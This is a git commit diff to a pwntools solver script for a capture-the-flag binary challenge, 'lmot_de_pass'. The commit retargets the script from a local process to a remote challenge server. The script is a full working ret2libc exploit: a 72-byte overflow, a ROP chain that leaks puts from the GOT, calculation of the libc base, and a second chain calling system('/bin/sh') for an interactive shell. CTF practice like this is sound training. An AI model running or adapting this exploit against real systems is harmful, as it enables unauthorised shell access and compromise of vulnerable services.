e7489017b6d0f6579719ac6a48dfed563eb0bb8c
H-Nouh <126291336+H-Nouh@users.noreply.github.com>
2026-08-08 23:59:33 +0100

    updated the solver

--- Flags-CTF/lmot_de_pass/solver.py
+++ Flags-CTF/lmot_de_pass/solver.py
@@ -7,39 +7,30 @@ elf = ELF('./vuln')
 libc = ELF('./libc.so.6')
 context.binary = elf
 
-# Force local process to use the supplied challenge libc.
-r = process(elf.path, env={'LD_PRELOAD': libc.path}, stdin=PTY, stdout=PTY)
+# r = elf.process()
+r = remote('lmdps.challs.itc-ctf.online', 9229, ssl=True)
 
 offset = 72
 
 rop = ROP(elf)
 rop.call(elf.symbols['puts'], [elf.got['puts']])
 
-
 payload = [
     b'A' * offset,
-    p64(0x000000000040101a), # ret
     rop.chain(),
-    p64(0x0000000000401194) # main
+    p64(0x0000000000401194) #main
 ]
 payload = b''.join(payload)
 
-r.recvuntil(b'> ')
+r.recv()
 r.sendline(payload)
-delim = b'\nAzul! I want the (mot de pass) I need it\n> '
-stage1 = r.recvuntil(delim)
-
-leak_raw = stage1[:-len(delim)]
-if leak_raw.startswith(b'Ciao!!!!\n'):
-    leak_raw = leak_raw[len(b'Ciao!!!!\n'):]
-puts = u64(leak_raw.ljust(8, b'\x00'))
+puts = u64(r.recvline().strip().ljust(8, b'\x00'))
 print(f'puts: {hex(puts)}')
 
 libc.address = puts - libc.symbols['puts']
 
 rop = ROP(libc)
 rop.call('system', [next(libc.search(b'/bin/sh\x00'))])
-
 
 payload = [
     b'A' * offset,
@@ -49,6 +40,7 @@ payload = [
 
 payload = b''.join(payload)
 
+r.recv()
 r.sendline(payload)
 
 r.interactive()
